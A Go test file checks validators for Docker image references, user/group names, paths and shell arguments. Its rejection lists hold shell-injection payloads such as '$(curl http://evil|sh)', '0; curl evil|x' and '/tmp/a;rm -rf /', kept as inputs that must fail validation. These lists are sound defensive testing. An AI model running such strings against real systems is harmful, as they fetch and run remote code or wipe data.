package files

import "testing"

const testImageDigest = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" // 64 hex chars

func TestValidImageRef(t *testing.T) {
	valid := []string{
		// task-specified canonical forms
		"nginx",
		"nginx:1.25",
		"library/nginx",
		"reg.example.com:5000/app:v1",
		"nginx@sha256:" + testImageDigest,
		// other legitimate shapes that must keep working
		"ubuntu:22.04",
		"ghcr.io/owner/img:v2.1.0",
		"reg.example.com/app@sha256:" + testImageDigest,
		"reg.example.com:5000/app:v1@sha256:" + testImageDigest,
		"localhost:5000/x",
		"MyApp_01:V1_BETA.2",              // uppercase kept, like ValidNameComponent
		"deep/nested/path/name",           // multi-level repository path
		"nginx@sha256:" + testImageDigest, // digest without tag
		"a1-b2.c3",                        // separators must be sandwiched by alphanumerics
	}
	for _, s := range valid {
		if !ValidImageRef(s) {
			t.Errorf("ValidImageRef(%q) = false, want true", s)
		}
	}

	invalid := []string{
		"",
		// task-specified injection payloads
		"nginx$(id)",
		"$(curl http://evil|sh)",
		"-a",
		"nginx;id",
		"nginx |id",
		// shell / option injection variants
		"-a --pull=always",
		"-nginx",
		"nginx&id",
		"nginx$x",
		"${HOME}",
		"nginx`id`",
		"nginx'x",
		"nginx\"x",
		"nginx a",
		"nginx\na",
		"nginx\ta",
		"a|b",
		"a;b",
		"a>b",
		"a<b",
		"a\\b",
		// malformed references docker itself rejects
		"foo/../bar",                            // dot-dot component
		"nginx-",                                // trailing separator
		"-nginx",                                // leading separator (also option injection)
		"nginx:",                                // empty tag
		"nginx:$tag",                            // tag with metacharacter
		"nginx:.b",                              // tag must start alphanumeric/underscore
		"nginx@",                                // empty digest
		"nginx@sha256:abc",                      // truncated digest
		"nginx@sha256:" + testImageDigest + "Z", // non-hex digest char
		"nginx@SHA256:" + testImageDigest,       // wrong algorithm case
		"nginx@" + testImageDigest,              // digest without algorithm
		"user@host/img",                         // '@' only valid for digests
		"nginx@sha256:" + testImageDigest + ";id",
	}
	for _, s := range invalid {
		if ValidImageRef(s) {
			t.Errorf("ValidImageRef(%q) = true, want false", s)
		}
	}
}

func TestValidImageRefLengthCap(t *testing.T) {
	long := ""
	for i := 0; i < 60 && len(long) <= 512; i++ {
		long += "segment/"
	}
	if ValidImageRef(long) {
		t.Errorf("ValidImageRef accepted a %d-char reference, want false above the cap", len(long))
	}
}

func TestValidUserGroup(t *testing.T) {
	valid := []string{
		"1000",
		"www-data",
		"root",
		"user_name",
		"user.name",
		"user-name",
		"UPPER_123",
		"0",
	}
	for _, s := range valid {
		if !ValidUserGroup(s) {
			t.Errorf("ValidUserGroup(%q) = false, want true", s)
		}
	}

	invalid := []string{
		"",
		"0; curl evil|x",
		"$(id)",
		"a&b",
		"a'b",
		`a"b`,
		"a b",
		"a|b",
		"a;b",
		"a$b",
		"a`b",
		"a(b)",
		"a\nb",
		"a> b",
		"a< b",
		"user@host",
		"user:group",
		"user/group",
		"user\\group",
	}
	for _, s := range invalid {
		if ValidUserGroup(s) {
			t.Errorf("ValidUserGroup(%q) = true, want false", s)
		}
	}
}

func TestValidPath(t *testing.T) {
	valid := []string{
		"/www/sites/site1/index",
		"/opt/1panel/backup/app",
		"/data/2026-08-27/backup",
		"/home/user/a b", // space alone is fine, the shell quote protects it
		"/tmp/名称",
	}
	for _, s := range valid {
		if !ValidPath(s) {
			t.Errorf("ValidPath(%q) = false, want true", s)
		}
	}

	invalid := []string{
		"",
		"/tmp/a;rm -rf /",
		"/tmp/$(id)",
		"/tmp/a&b",
		"/tmp/a|b",
		"/tmp/a'b",
		`/tmp/a"b`,
		"/tmp/`id`",
		"/tmp/a(b)",
		"/tmp/a\nb",
		"/tmp/a\rb",
		"/tmp/a>b",
		"/tmp/a<b",
		"/tmp/$HOME",
	}
	for _, s := range invalid {
		if ValidPath(s) {
			t.Errorf("ValidPath(%q) = true, want false", s)
		}
	}
}

func TestValidShellArgs(t *testing.T) {
	valid := []string{
		"/www/sites/site1/backup.zip",
		"/opt/1panel/my backup/app.tar.gz",
		"/data/备份/数据库.tar.gz",
		"my file with spaces.txt",
		"secret phrase with spaces",
	}
	for _, s := range valid {
		if !ValidShellArgs(s) {
			t.Errorf("ValidShellArgs(%q) = false, want true", s)
		}
	}

	invalid := []string{
		"",
		"/tmp/a;id",
		"/tmp/$(id)",
		"/tmp/`id`",
		"/tmp/a&whoami",
		"/tmp/a|id",
		"/tmp/a'id",
		`/tmp/a"id`,
		"/tmp/a(b)",
		"/tmp/a\nid",
		"/tmp/a\rid",
		"/tmp/a>out",
		"/tmp/a<in",
		"/tmp/$HOME",
		"p@ss'w0rd",
	}
	for _, s := range invalid {
		if ValidShellArgs(s) {
			t.Errorf("ValidShellArgs(%q) = true, want false", s)
		}
	}
}
